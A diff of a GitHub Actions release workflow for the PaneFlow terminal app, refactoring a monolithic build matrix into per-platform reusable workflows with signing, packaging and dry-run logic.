@@ -1,25 +1,17 @@
 name: release
 
+# The orchestrator of a release. `preflight` resolves the commit once,
+# `ci-verdict` requires `run_tests` green on it, one reusable workflow per
+# platform builds, signs and smokes its own artifacts, the Linux packages are
+# installed on five distributions, and the last job publishes. Every step
+# calls a script: docs/release/runbook.md, "Release scripts", lists them.
 on:
   push:
     tags: ["v*"]
-  # US-003: dry-run dispatch. Manually-triggered runs build the full
-  # matrix (including sign + notarize + dmg + msi + smoke tests) but
-  # skip every downstream public side-effect:
-  #   - no GitHub Release (`release:` job is gated on RELEASE_MODE)
-  #   - no Homebrew Cask update (update_cask.yml chains on this
-  #     workflow through `workflow_run` and requires a successful
-  #     `push` run, so a dispatched run is filtered out)
-  #   - no APT/RPM repo publish (repo_publish.yml gates on
-  #     `workflow_run.event == 'push'`; a workflow_dispatch run
-  #     surfaces as `workflow_dispatch` and is filtered out)
-  # Windows ships only as the .msi attached to the GitHub Release, so
-  # skipping the release job also skips Windows distribution.
-  # Use case: validate the signing + packaging chain on a branch
-  # before cutting a tag. Artifacts land as workflow artifacts with
-  # 7-day retention (see the build job's Upload step), and the
-  # `dry-run-summary` job at the bottom of this file fans them out
-  # with SHA-256 hashes into the Actions UI Summary.
+  # A dispatch is a dry-run. It builds the whole matrix and publishes
+  # nothing: the publish job runs on a tag push only, and `update_cask.yml`
+  # and `repo_publish.yml` ignore a release run that a push did not start.
+  # Its artifacts stay 7 days, listed with their SHA-256 in the run summary.
   workflow_dispatch:
     inputs:
       version:
@@ -40,51 +32,38 @@ on:
 permissions:
   contents: read
 
-# A release builds from a clean state and never touches the Actions cache:
-# a tag-scoped entry can only serve a re-run of that tag, and each one evicts
-# an entry `run_tests` restores on `main`.
+# A release builds from a clean state and never touches the Actions cache: a
+# tag-scoped entry serves only a re-run of that tag and evicts an entry
+# `run_tests` restores on `main`. The setting applies to the called workflows.
 cache-mode: none
 
-# Serialize every release run, whatever its tag. A tag-push race (or a
-# dry-run launched on top of a real tag) shouldn't double-publish or
-# interrupt a half-baked upload - `cancel-in-progress: false` lets the first
-# run finish atomically. `queue: max` keeps every waiting run instead of the
-# default single pending slot, which cancels the older waiter: two tags
-# pushed a minute apart both publish, in the order they were pushed.
+# One release at a time, never cancelled. `queue: max` keeps every waiting
+# run, so two tags pushed a minute apart both publish, in the order pushed.
 concurrency:
   group: ${{ github.workflow }}
   cancel-in-progress: false
   queue: max
 
-# Every implicit-bash step runs with -e fail-on-error, -u error-on-unset,
-# -o pipefail propagate pipe failures. Never -x: xtrace echoes secrets and
-# multi-line values into the public log, and scripts/check-workflows.sh
-# rejects it. Per-step `shell: pwsh` overrides this default.
+# Never -x: xtrace writes secrets into the public log, and
+# scripts/check-workflows.sh rejects it.
 defaults:
   run:
     shell: bash -euo pipefail {0}
 
 env:
-  CARGO_TERM_COLOR: always
-  # US-003: synthesize the canonical TAG every downstream packaging
-  # step already uses as its version source (every `cp`, sha256, .deb,
-  # .rpm, .dmg, .msi name resolves through `${TAG#v}`). In tag-push
-  # mode RELEASE_TAG echoes `github.ref_name`; in workflow_dispatch
-  # (dry-run) we synthesize `v<inputs.version>` so the `${TAG#v}`
-  # strip stays correct and asset names stay consistent across modes.
-  # The `&&` short-circuits before `format()` runs on push events
-  # (where `inputs.version` is null), so this is safe in both
-  # contexts.
+  # `v<version>`: the pushed tag, or the version a dry-run was dispatched
+  # with, so asset names are the same in both modes.
   RELEASE_TAG: ${{ github.event_name == 'workflow_dispatch' && format('v{0}', inputs.version) || github.ref_name }}
-  # A dry-run may need to exercise an upgrade from the latest release while
-  # the checked-out source still reports that same version. The override only
-  # changes the non-published MSI ProductVersion; real releases always use the
-  # tag version, including prereleases normalized by cargo-wix, and the smoke
-  # enforces that equality.
+  # A dry-run may exercise an upgrade while the source still reports the
+  # released version: the override changes only the unpublished MSI.
   WINDOWS_MSI_VERSION: ${{ github.event_name == 'workflow_dispatch' && (inputs.msi_upgrade_version || inputs.version) || github.ref_name }}
-  # Mode flag consumed by per-step `if:` / `continue-on-error:` gates
-  # so a dry-run can never accidentally publish a Release.
   RELEASE_MODE: ${{ github.event_name == 'workflow_dispatch' && 'dry-run' || 'release' }}
+  # Signing secrets live in the `release` environment, whose deployment
+  # policy admits only `main` and `v*` tags and checks the ref the run was
+  # started from, not the `target_ref` it builds. So a run signs on a tag
+  # push, or on a dispatch from `main` that also builds `main`. Any other
+  # run uses no environment, gets no secret and builds unsigned artifacts.
+  SIGNED: ${{ (github.event_name == 'push' && startsWith(github.ref, 'refs/tags/v')) || (github.ref == 'refs/heads/main' && (inputs.target_ref || 'main') == 'main') }}
 
 jobs:
   # The commit this run builds is resolved once, here, and every other
@@ -99,6 +78,10 @@ jobs:
     timeout-minutes: 5
     outputs:
       sha: ${{ steps.resolve.outputs.sha }}
+      tag: ${{ env.RELEASE_TAG }}
+      mode: ${{ env.RELEASE_MODE }}
+      msi_version: ${{ env.WINDOWS_MSI_VERSION }}
+      signed: ${{ env.SIGNED }}
     steps:
       - uses: actions/checkout@93cb6efe18208431cddfb8368fd83d5badbf9bfd # v5.0.1
         with:
@@ -116,7 +99,7 @@ jobs:
           TARGET_REF: ${{ inputs.target_ref }}
           VERSION: ${{ inputs.version }}
           MSI_UPGRADE_VERSION: ${{ inputs.msi_upgrade_version }}
-          MSI_SMOKES: ${{ (github.event_name == 'push' && startsWith(github.ref, 'refs/tags/v')) || (github.ref == 'refs/heads/main' && (inputs.target_ref || 'main') == 'main') }}
+          MSI_SMOKES: ${{ env.SIGNED }}
         run: scripts/release-preflight.sh
 
       # Every build leg bakes the embedded update key into the binary, and a
@@ -171,1056 +154,70 @@ jobs:
           RESUME_REF: ${{ github.event_name == 'workflow_dispatch' && (inputs.target_ref || 'main') || github.ref_name }}
         run: scripts/require-ci-verdict.sh "$RELEASE_SHA" "$RESUME_REF"
 
-  # The four build legs run as three jobs, one per platform, that share one
-  # step list through the `build_steps` YAML anchor: `build-linux` defines it
-  # and `build-macos` and `build-windows` alias it. A smoke job then needs
-  # only the build of its own platform, so the Windows MSI smokes no longer
-  # wait for the Linux legs, and "Re-run failed jobs" rebuilds only the
-  # platform that failed. The steps select their platform through
-  # `runner.os` and `matrix.*`, which every one of the three jobs defines.
-  build-linux:
-    name: Build ${{ matrix.target }}
+  # One reusable workflow per platform. Each receives only the secrets of its
+  # platform, by name, and declares its own permissions and timeouts. "Re-run
+  # failed jobs" re-runs only the platform that failed. A leg that fails
+  # blocks the publish job, which needs all three.
+  linux:
+    name: Linux
     needs: preflight
-    runs-on: ${{ matrix.runs-on }}
-    # The Linux binaries are built in Ubuntu 22.04 userland, on a 24.04 host:
-    # the hosted 22.04 images retire on 2027-04-17, and the packages still
-    # promise "Ubuntu 22.04+" (`packaging/debian/postinst`), that is glibc
-    # 2.35. Everything the build links, and everything linuxdeploy copies
-    # into the AppImage, therefore comes from this image, pinned by the
-    # digest of its multi-arch index. The "Require glibc 2.35" step below
-    # fails the leg if a binary asks for a newer symbol version.
-    container:
-      image: ubuntu:22.04@sha256:0e0a0fc6d18feda9db1590da249ac93e8d5abfea8f4c3c0c849ce512b5ef8982
-    timeout-minutes: 55
-    # Signing secrets live in the `release` environment, whose deployment
-    # policy admits only `main` and `v*` tags. The policy checks the ref the
-    # run was dispatched from, not the `target_ref` it builds, so the build
-    # signs only a tag push or a dispatch from `main` that also builds `main`.
-    # Anything else runs with no environment at all, gets no signing secret,
-    # builds unsigned dry-run artifacts, and never trips the policy.
-    environment: ${{ ((github.event_name == 'push' && startsWith(github.ref, 'refs/tags/v')) || (github.ref == 'refs/heads/main' && (inputs.target_ref || 'main') == 'main')) && 'release' || '' }}
-    # Every leg is hard-required: the publish job needs the three build
-    # jobs, so a failed Linux, macOS, or Windows build blocks publishing.
-    strategy:
-      # Atomicity comes from `release.needs`, not from cancelling siblings:
-      # with fail-fast a macOS failure cancelled both Linux legs after 23
-      # minutes of work, and the re-run had to rebuild all four.
-      fail-fast: false
-      matrix:
-        include:
-          - target: x86_64-unknown-linux-gnu
-            arch: x86_64
-            runs-on: ubuntu-24.04
-          # Hosted ARM runner (in GitHub public preview since late 2024) -
-          # explicitly NOT `cross` and NOT QEMU, matching Zed's own
-          # `bundle_linux_aarch64` pattern. Spike evidence:
-          # tasks/spike-aarch64-build.md.
-          - target: aarch64-unknown-linux-gnu
-            arch: aarch64
-            runs-on: ubuntu-24.04-arm
-          # CLOSED TARGET - x86_64-apple-darwin (Intel Mac / macos-13)
-          # Decision: 2026-04-21 (US-008, v0.2.1). Removed from the
-          # matrix entirely until v0.3.0's macOS release cut. Two
-          # blockers, either of which would have been enough on its
-          # own: (1) Apple Dev secrets (APPLE_DEVELOPER_CERT_P12,
-          # APPLE_DEVELOPER_CERT_PASSWORD, APPLE_TEAM_ID) are not yet
-          # provisioned, so the leg would fail at the `Sign macOS .app
-          # bundle` step regardless of the runner queue; (2) macos-13
-          # runner queue times have been 30-60 min+, which would block
-          # the `Publish GitHub Release` job even with
-          # `continue-on-error: true` (GHA waits for every matrix leg
-          # to complete before downstream `needs:` fires). Restoration
-          # requires both: Apple Dev secrets provisioning per
-          # memory/project_macos_signing.md AND either (a) queue-SLA
-          # improvement at GitHub Actions or (b) a matrix-strategy
-          # refactor of the `Publish` job's `needs:` to not block on
-          # best-effort legs.
-          # Historical Windows closure context: Windows was absent from
-          # the matrix while Trusted Signing was not provisioned because
-          # an unsigned MSI would trigger SmartScreen and fail winget
-          # validation. Now that the Windows leg is restored, it is a
-          # hard release gate like Linux and macOS.
+    uses: ./.github/workflows/release-linux.yml
+    with:
+      sha: ${{ needs.preflight.outputs.sha }}
+      tag: ${{ needs.preflight.outputs.tag }}
+      mode: ${{ needs.preflight.outputs.mode }}
+      signed: ${{ needs.preflight.outputs.signed == 'true' }}
+    secrets:
+      POSTHOG_API_KEY: ${{ secrets.POSTHOG_API_KEY }}
+      GPG_PRIVATE_KEY: ${{ secrets.GPG_PRIVATE_KEY }}
+      GPG_PASSPHRASE: ${{ secrets.GPG_PASSPHRASE }}
+      GPG_KEY_ID: ${{ secrets.GPG_KEY_ID }}
+      MINISIGN_SECRET_KEY: ${{ secrets.MINISIGN_SECRET_KEY }}
 
-    steps: &build_steps
-      - name: Prepare the Ubuntu 22.04 build container
-        # The bare `ubuntu:22.04` image has no git, so `actions/checkout`
-        # would fall back to a tarball with no history, and neither curl nor
-        # sudo, which `fetch-libghostty` and `linux-build-deps` call.
-        if: runner.os == 'Linux'
-        run: |
-          apt-get -o Acquire::Retries=3 update
-          apt-get -o Acquire::Retries=3 install -y --no-install-recommends ca-certificates curl git sudo
-
-      - uses: actions/checkout@93cb6efe18208431cddfb8368fd83d5badbf9bfd # v5.0.1
-        with:
-          persist-credentials: false
-          ref: ${{ needs.preflight.outputs.sha }}
-
-      # Every leg links the published archive for its own target, which
-      # fetch-libghostty verifies against `archive_sha256` in the manifest.
-      # The Linux legs used to rebuild it from the Ghostty source, twice, to
-      # reproduce those same bytes: 12 minutes on the slowest leg.
-      # `libghostty-linux.yml` owns that reproducibility proof, on every
-      # recipe change and every night.
-      - uses: ./.github/actions/fetch-libghostty
-
-      - name: Install system dependencies
-        if: runner.os == 'Linux'
-        uses: ./.github/actions/linux-build-deps
-        with:
-          container-toolchain: "true"
-          extra-packages: >-
-            binutils
-            elfutils
-            jq
-            patchelf
-            lintian
-            dpkg-sig
-            rpm
-            gnupg
-            appstream
-            imagemagick
-            icnsutils
-
-      # ImageMagick is preinstalled on windows-2022 and the macos-15 GHA images
-      # ship sips (Apple's built-in resizer) + iconutil out of the box, but
-      # neither ships ImageMagick. scripts/build-icons.sh prefers `magick` for
-      # multi-resolution .ico assembly, so install it here on the macOS leg only
-      # - the Linux leg picks up `imagemagick` through the linux-build-deps
-      # extra packages above and the Windows leg uses the preinstalled copy.
-      - name: Install ImageMagick (macOS)
-        if: runner.os == 'macOS'
-        run: brew install --quiet imagemagick
-
-      - name: Setup MSVC developer environment
-        if: runner.os == 'Windows'
-        shell: pwsh
-        run: ./scripts/msvc-dev-env.ps1 -Arch x64
-
-      - name: Verify Windows compiler and signing tools
-        if: runner.os == 'Windows'
-        shell: pwsh
-        run: ./scripts/check-windows-build-tools.ps1
-
-      # US-002 AC3 - validate the AppStream metainfo XML before any packaging
-      # step touches it. Invalid metainfo would (a) make `.deb`/`.rpm` install
-      # a broken `/usr/share/metainfo/*.xml` that GNOME Software / KDE Discover
-      # would ignore, and (b) block distro submission. Fail-fast here so a
-      # malformed `<releases>` block (e.g., after a version bump that forgot
-      # the `<release>` entry) never makes it into a shipped artifact.
-      - name: Validate AppStream metainfo
-        if: runner.os == 'Linux'
-        run: |
-          appstreamcli validate \
-            --no-net \
-            --pedantic \
-            assets/io.github.arthurdev44.paneflow.metainfo.xml
-
-      - name: Verify AppStream release version freshness
-        if: runner.os == 'Linux'
-        run: scripts/check-appstream-version.sh
-
-      # Pinned via repo-level `rust-toolchain.toml` (US-001). Use the
-      # `@master` ref + explicit `toolchain` input so the action reads the
-      # same channel everywhere instead of resolving `@stable` at runtime,
-      # which drifts each Rust point release and broke fmt mid-v0.2.11.
-      - uses: dtolnay/rust-toolchain@fa04a1451ff1842e2626ccb99004d0195b455a88
-        with:
-          # Must match `rust-toolchain.toml` channel verbatim. The
-          # workspace dep graph (oo7, cosmic-text, smol_str, wgpu)
-          # requires rustc >= 1.92, so this can't drift below 1.92.
-          toolchain: "1.98.0"
-          components: rustfmt, clippy
-          targets: ${{ matrix.target }}
-
-      - name: Install cargo-deb (pinned)
-        if: runner.os == 'Linux'
-        run: cargo install cargo-deb --version 3.6.3 --locked
-
-      - name: Install cargo-generate-rpm (pinned)
-        if: runner.os == 'Linux'
-        # Version pinned to the one we validated against the TOML schema in
-        # US-014. Bumping 0.20.0 → anything else requires re-reading the
-        # upstream README: the `assets` inline-table grammar has changed in
-        # prior minor versions.
-        run: cargo install cargo-generate-rpm --version 0.20.0 --locked
-
-      # Regenerate every icon asset (.png hicolor set, .icns, .ico,
-      # rust-embed runtime icon) from the master PNGs under
-      # `assets/icons/master/`. Script is a no-op when no master is present,
-      # so this step is safe to land before the masters are committed.
-      # Placement rationale: runs BEFORE `Build release binary` and all
-      # packaging steps, so cargo-deb / cargo-generate-rpm / bundle-macos.sh
-      # / cargo-wix all see fresh icons from this same checkout.
-      # `shell: bash` because the script is bash; on the Windows runner this
-      # invokes Git Bash and consumes the preinstalled `magick` binary.
-      - name: Regenerate icons from master
-        shell: bash
-        run: bash scripts/build-icons.sh
-
-      # ─── Windows MSI/signing gate (early) ────────────────────────────────
-      # Detect whether the 6 Azure Trusted Signing secrets are populated
-      # BEFORE any MSI/packaging step runs. When any are missing, every
-      # subsequent Windows-only packaging step (Preflight WiX, Install
-      # cargo-wix, Produce MSI, Sign, Verify, Stage) is skipped - only
-      # the Build release binary step remains, which preserves the Windows
-      # release compile without noisy red failures from cargo-wix or
-      # unsigned-MSI artifacts.
-      #
-      # Routing: secrets go through env: so an unset secret resolves to
-      # an empty string (not the literal `${{ secrets.NAME }}` placeholder
-      # which would always look "present"). The 6 names match what
-      # `scripts/sign-windows.ps1` reads at runtime - see
-      # `memory/project_windows_signing.md` for the canonical list.
-      - name: Detect Windows signing secrets
-        id: windows_signing
-        if: runner.os == 'Windows'
-        shell: bash
-        env:
-          AZURE_TENANT_ID: ${{ secrets.AZURE_TENANT_ID }}
-          AZURE_CLIENT_ID: ${{ secrets.AZURE_CLIENT_ID }}
-          AZURE_CLIENT_SECRET: ${{ secrets.AZURE_CLIENT_SECRET }}
-          AZURE_TRUSTED_SIGNING_ENDPOINT: ${{ secrets.AZURE_TRUSTED_SIGNING_ENDPOINT }}
-          AZURE_TRUSTED_SIGNING_ACCOUNT: ${{ secrets.AZURE_TRUSTED_SIGNING_ACCOUNT }}
-          AZURE_TRUSTED_SIGNING_CERT_PROFILE: ${{ secrets.AZURE_TRUSTED_SIGNING_CERT_PROFILE }}
-        run: scripts/detect-windows-signing.sh
-
-      # Windows Application Control / Smart App Control evaluates the helper
-      # executable that actually runs from the PaneFlow terminal PATH. The
-      # outer `paneflow.exe` signature does not cover helper bytes after
-      # extraction, so sign the embedded helper artifacts before the app build
-      # ingests them via rust-embed. The build and the signing are two steps
-      # so that no `cargo` process, and no build script it runs, ever sees an
-      # Azure signing secret.
-      - name: Build Windows embedded helpers
-        if: runner.os == 'Windows' && steps.windows_signing.outputs.signing_available == 'true'
-        shell: pwsh
-        env:
-          TARGET: ${{ matrix.target }}
-        run: ./scripts/build-windows-helpers.ps1 -Target $env:TARGET
-
-      - name: Sign and stage Windows embedded helpers
-        id: windows_helpers
-        if: runner.os == 'Windows' && steps.windows_signing.outputs.signing_available == 'true'
-        shell: pwsh
-        env:
-          TARGET: ${{ matrix.target }}
-          AZURE_TENANT_ID: ${{ secrets.AZURE_TENANT_ID }}
-          AZURE_CLIENT_ID: ${{ secrets.AZURE_CLIENT_ID }}
-          AZURE_CLIENT_SECRET: ${{ secrets.AZURE_CLIENT_SECRET }}
-          AZURE_TRUSTED_SIGNING_ENDPOINT: ${{ secrets.AZURE_TRUSTED_SIGNING_ENDPOINT }}
-          AZURE_TRUSTED_SIGNING_ACCOUNT: ${{ secrets.AZURE_TRUSTED_SIGNING_ACCOUNT }}
-          AZURE_TRUSTED_SIGNING_CERT_PROFILE: ${{ secrets.AZURE_TRUSTED_SIGNING_CERT_PROFILE }}
-        run: ./scripts/stage-windows-helpers.ps1 -Target $env:TARGET
-
-      - name: Validate Windows helper packaging set
-        if: runner.os == 'Windows' && steps.windows_helpers.outputs.helpers_prepared == 'true'
-        shell: pwsh
-        env:
-          TARGET: ${{ matrix.target }}
-        run: ./scripts/check-wix-helper-set.ps1 -Target $env:TARGET
-
-      # --- Release build ---
-      # `POSTHOG_API_KEY` is resolved by `option_env!` at compile time
-      # (see `src-app/src/app/bootstrap.rs`); embedding it here at the
-      # single `cargo build --release` step is sufficient for every
-      # downstream artifact (tar.gz, .deb, .rpm, AppImage, .dmg, and the
-      # cargo-wix MSI which consumes this build via `--no-build`). If the
-      # secret is absent the startup log::warn! surfaces and events are
-      # silently dropped - never a user-facing failure.
-      - name: Build release binary
-        env:
-          POSTHOG_API_KEY: ${{ secrets.POSTHOG_API_KEY }}
-          # US-002 (prd-audit-remediation): bake the minisign public key(s)
-          # into the binary so the self-updater can verify downloaded
-          # artifacts (option_env! in update/signature.rs). PUBLIC keys →
-          # repository *variables*, never secrets. Two slots (current + next)
-          # for zero-downtime rotation; an unset var resolves to "" which
-          # the verifier treats as "no key in this slot".
-          PANEFLOW_MINISIGN_PUBKEY: ${{ vars.PANEFLOW_MINISIGN_PUBKEY }}
-          PANEFLOW_MINISIGN_PUBKEY_NEXT: ${{ vars.PANEFLOW_MINISIGN_PUBKEY_NEXT }}
-          TARGET: ${{ matrix.target }}
-          WINDOWS_HELPERS_PREPARED: ${{ steps.windows_helpers.outputs.helpers_prepared }}
-        if: runner.os != 'Windows'
-        run: |
-          if [ "${WINDOWS_HELPERS_PREPARED:-}" = "true" ]; then
-            export PANEFLOW_SKIP_EMBED_BUILD=1
-          fi
-          # Every leg links the pinned archive for its own target. There is
-          # deliberately no fallback branch: a missing, corrupt, or
-          # hash-mismatched archive fails `paneflow-libghostty-sys`'s build
-          # script with the corrective `scripts/build-libghostty-*` action, so
-          # a release cannot silently ship without the engine its notes claim.
-          case "$RUNNER_OS" in
-            Linux | macOS) ;;
-            *)
-              echo "::error::unexpected runner OS '$RUNNER_OS' on the POSIX build leg"
-              exit 1
-              ;;
-          esac
-          cargo build --release -p paneflow-app -p paneflow-host --locked --target "$TARGET"
-
-      - name: Verify packaged libghostty identity and static linkage
-        if: runner.os == 'Linux'
-        env:
-          TARGET: ${{ matrix.target }}
-        run: |
-          scripts/verify-libghostty-package.sh \
-            --binary "target/$TARGET/release/paneflow" \
-            --notice native/libghostty/THIRD_PARTY_NOTICES.md
-
-      # The supported floor is Ubuntu 22.04, glibc 2.35. A binary that needs a
-      # newer symbol version fails to start there with "version `GLIBC_2.36'
-      # not found", and nothing else in the release would notice: the package
-      # smokes that run it are newer distributions. The three helpers are the
-      # binaries `paneflow` embeds and extracts at run time.
-      - name: Require glibc 2.35 as the highest symbol version
-        if: runner.os == 'Linux'
-        env:
-          TARGET: ${{ matrix.target }}
-        run: |
-          scripts/check-glibc-floor.sh 2.35 \
-            "target/$TARGET/release/paneflow" \
-            "target/$TARGET/release/paneflow-host" \
-            "target/embed-build/$TARGET/release-min/paneflow-shim" \
-            "target/embed-build/$TARGET/release-min/paneflow-ai-hook" \
-            "target/embed-build/$TARGET/release-min/paneflow-mcp"
-
-      # The helper caps are defined for Linux x86_64, and these are the bytes
-      # the release embeds: built by `src-app/build.rs` with the 22.04
-      # toolchain of the build container.
-      - name: Helper binary size budget
-        if: runner.os == 'Linux' && matrix.arch == 'x86_64'
-        env:
-          TARGET: ${{ matrix.target }}
-        run: scripts/check-helper-sizes.sh "target/embed-build/$TARGET/release-min"
-
-      # US-016 AC2: the Mach-O analog of the Linux step above. It runs on the
-      # freshly built binary, before bundling, so a leg that produced an
-      # engine-less or dynamically linked artifact fails here rather than
-      # reaching signing and notarization.
-      - name: Verify packaged libghostty identity and static linkage (macOS)
-        if: runner.os == 'macOS'
-        env:
-          TARGET: ${{ matrix.target }}
-        run: |
-          scripts/verify-libghostty-macos.sh \
-            --binary "target/$TARGET/release/paneflow" \
-            --notice native/libghostty/THIRD_PARTY_NOTICES.md
-
-      - name: Build release binary (Windows)
-        if: runner.os == 'Windows'
-        shell: pwsh
-        env:
-          POSTHOG_API_KEY: ${{ secrets.POSTHOG_API_KEY }}
-          PANEFLOW_MINISIGN_PUBKEY: ${{ vars.PANEFLOW_MINISIGN_PUBKEY }}
-          PANEFLOW_MINISIGN_PUBKEY_NEXT: ${{ vars.PANEFLOW_MINISIGN_PUBKEY_NEXT }}
-          TARGET: ${{ matrix.target }}
-          WINDOWS_HELPERS_PREPARED: ${{ steps.windows_helpers.outputs.helpers_prepared }}
-        run: |
-          if ($env:WINDOWS_HELPERS_PREPARED -eq 'true') {
-              $env:PANEFLOW_SKIP_EMBED_BUILD = '1'
-          }
-          cargo build --release -p paneflow-app -p paneflow-host --locked --target $env:TARGET
-          if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }
-
-      # --- Phase 1 artifacts ---
-      - name: Produce tar.gz
-        if: runner.os == 'Linux'
-        # `TAG` routed via `env:` rather than inlining `${{ github.ref_name }}`
-        # in the shell body - same injection-hardening rationale as the
-        # AppImage step below (attacker-controlled tags must not reach bash
-        # via GitHub Actions expression substitution).
-        env:
-          TARGET: ${{ matrix.target }}
-          ARCH: ${{ matrix.arch }}
-          TAG: ${{ env.RELEASE_TAG }}
-        # `${TAG#v}` strips the leading `v` so the bundled artifact is
-        # `paneflow-<semver>-<arch>.tar.gz` (no `v` prefix), matching the
-        # naming convention macOS and Windows already follow. Until v0.3.0
-        # the Linux assets were `paneflow-v<semver>-<arch>.tar.gz`, a
-        # historical inconsistency that's safe to drop because the in-app
-        # update matcher (`update/checker.rs::pick_asset`) is suffix-only
-        # (`ends_with("-<arch>.tar.gz")`) and version-agnostic.
-        run: bash scripts/bundle-tarball.sh "${TAG#v}"
-
-      - name: Produce .deb
-        if: runner.os == 'Linux'
-        run: cargo deb --no-build -p paneflow-app --target ${{ matrix.target }}
-
-      - name: Lintian check
-        if: runner.os == 'Linux'
-        run: |
-          lintian \
-            --suppress-tags bad-distribution-in-changes-file \
-            target/${{ matrix.target }}/debian/*.deb
-
-      - name: Produce .rpm
-        if: runner.os == 'Linux'
-        # `-p src-app` is the DIRECTORY path (relative to workspace root),
-        # not the crate name - cargo-generate-rpm 0.20.0 resolves `-p`
-        # strictly as a path. `-p paneflow-app` fails with "No such file
-        # or directory: paneflow-app/Cargo.toml".
-        #
-        # `--target` aligns with the earlier cargo-build output dir and
-        # drops the artifact at target/<triple>/generate-rpm/. Source
-        # paths in `[package.metadata.generate-rpm]` that start with
-        # `target/release/` are auto-rewritten to match.
-        run: cargo generate-rpm -p src-app --target ${{ matrix.target }}
-
-      # ─── US-017 GPG signing ────────────────────────────────────────────
-      # Signs the freshly-built .deb and .rpm with the release key
-      # (`GPG_PRIVATE_KEY` secret) so dpkg-sig / rpm --checksig accept
-      # them, and so `dnf install` on an `gpgcheck=1` client succeeds.
-      #
-      # Tool choice: `dpkg-sig` for BOTH sign + verify on the .deb side.
-      # The earlier PRD draft called for `debsigs --sign=origin` + `dpkg-sig --verify`,
-      # but those produce incompatible signature formats - the verify
-      # step would fail on everything `debsigs` wrote. `dpkg-sig` is the
-      # de-facto CI choice (simple GPG clearsign, no debsig-verify policy
-      # XML required).
-      #
-      # HARD-FAIL contract (AC7): if the GPG_PRIVATE_KEY secret is
-      # missing or malformed, the workflow exits NON-ZERO with the exact
-      # AC-mandated string "GPG signing failed: key not loaded". No
-      # silent-unsigned-release path. The release-creating step at the
-      # end of the job is downstream - it never runs if we exit here.
-      - name: Sign .deb and .rpm with release key
-        if: runner.os == 'Linux'
-        env:
-          GPG_PRIVATE_KEY: ${{ secrets.GPG_PRIVATE_KEY }}
-          GPG_PASSPHRASE: ${{ secrets.GPG_PASSPHRASE }}
-          GPG_KEY_ID: ${{ secrets.GPG_KEY_ID }}
-          TARGET: ${{ matrix.target }}
-        run: scripts/sign-linux-packages.sh "$TARGET"
-
-      - name: Produce AppImage
-        if: runner.os == 'Linux'
-        # `TAG` routed via `env:` rather than inlining `${{ github.ref_name }}`
-        # in the shell body - same injection-hardening rationale as the
-        # staging step below (attacker-controlled tags must not reach bash
-        # via expression substitution).
-        env:
-          TARGET: ${{ matrix.target }}
-          ARCH: ${{ matrix.arch }}
-          TAG: ${{ env.RELEASE_TAG }}
-        # `${TAG#v}` strips the leading `v`. See the bundle-tarball
-        # invocation above for the rationale (consistency with macOS/
-        # Windows naming + safe under suffix-only update matcher).
-        run: bash scripts/bundle-appimage.sh "${TAG#v}"
-
-      # ─── US-019 macOS .app assembly ──────────────────────────────────
-      # Mirrors the run_tests.yml Xcode preflight (kept intentionally duplicated
-      # - a drift here, e.g. an old runner image missing the Metal
-      # toolchain, surfaces as a labelled preflight failure rather than a
-      # cryptic mid-compile error).
-      - name: Verify Xcode CLT + Metal toolchain (macOS)
-        if: runner.os == 'macOS'
-        run: scripts/check-xcode-metal.sh
-
-      # Assemble the .app bundle from the release binary cargo just built
-      # (the preceding "Build release binary" step ran for every leg
-      # including macOS, so target/<triple>/release/paneflow exists).
-      # `--version "${TAG#v}"` strips the leading 'v': Apple's
-      # CFBundleShortVersionString (stamped into Info.plist) must be
-      # bare semver. The .dmg filename US-008 matches on is also
-      # v-stripped (paneflow-0.2.0-aarch64-apple-darwin.dmg).
-      - name: Produce .app bundle
-        if: runner.os == 'macOS'
-        env:
-          ARCH: ${{ matrix.arch }}
-          TAG: ${{ env.RELEASE_TAG }}
-        run: bash scripts/bundle-macos.sh --version "${TAG#v}" --arch "$ARCH"
-
-      # ─── US-015 / US-023 macOS codesign + notarize ───────────────────
-      # The `if: runner.os == 'macOS'` guard skips these steps silently on
-      # every Linux / Windows leg.
-      #
-      # Secrets used (must be populated in repo settings before the first
-      # signed macOS release can ship; see docs/release/macos-signing.md):
-      #   APPLE_DEVELOPER_CERT_P12        - base64-encoded .p12
-      #   APPLE_DEVELOPER_CERT_PASSWORD   - password to decrypt the .p12
-      #   APPLE_ID                        - Apple Developer account email
-      #   APPLE_APP_SPECIFIC_PASSWORD     - app-specific password (not the
-      #                                     Apple ID password itself)
-      #   APPLE_TEAM_ID                   - 10-char team ID
-      #
-      # US-023 AC7: dry-runs can degrade to an unsigned build when Apple
-      # secrets are missing. Tag-push releases fail hard instead, because
-      # shipping a public macOS artifact without signing and notarization
-      # breaks the release contract. The "Detect macOS signing secrets"
-      # step exposes a boolean output consumed by the sign + notarize
-      # step guards below.
-      #
-      # The `.app` input comes from `scripts/bundle-macos.sh`, run earlier
-      # in this leg. Sign → notarize → staple is the mandatory order:
-      # codesign attaches a signature with the release entitlements,
-      # notarytool validates + registers it with Apple, stapler glues the
-      # ticket to the bundle so Gatekeeper accepts it offline.
-      - name: Detect macOS signing secrets
-        id: macos_signing
-        if: runner.os == 'macOS'
-        env:
-          # Secrets are routed through env: so an empty secret resolves
-          # to an empty env var (rather than the literal string
-          # `${{ secrets.NAME }}` which would always look "present").
-          APPLE_DEVELOPER_CERT_P12: ${{ secrets.APPLE_DEVELOPER_CERT_P12 }}
-          APPLE_DEVELOPER_CERT_PASSWORD: ${{ secrets.APPLE_DEVELOPER_CERT_PASSWORD }}
-          APPLE_ID: ${{ secrets.APPLE_ID }}
-          APPLE_APP_SPECIFIC_PASSWORD: ${{ secrets.APPLE_APP_SPECIFIC_PASSWORD }}
-          APPLE_TEAM_ID: ${{ secrets.APPLE_TEAM_ID }}
-        run: scripts/detect-macos-signing.sh
-
-      - name: Sign macOS .app bundle
-        if: runner.os == 'macOS' && steps.macos_signing.outputs.signing_available == 'true'
-        env:
-          APPLE_DEVELOPER_CERT_P12: ${{ secrets.APPLE_DEVELOPER_CERT_P12 }}
-          APPLE_DEVELOPER_CERT_PASSWORD: ${{ secrets.APPLE_DEVELOPER_CERT_PASSWORD }}
-          APPLE_TEAM_ID: ${{ secrets.APPLE_TEAM_ID }}
-        # No --entitlements override: sign-macos.sh defaults to
-        # packaging/macos/paneflow.entitlements via REPO_ROOT-relative
-        # absolute path, which is more robust than this step's working
-        # directory assumption.
-        run: bash scripts/sign-macos.sh dist/PaneFlow.app
-
-      - name: Notarize + staple macOS .app bundle
-        if: runner.os == 'macOS' && steps.macos_signing.outputs.signing_available == 'true'
-        # US-003 AC6: in dry-run mode a transient Apple Notary outage
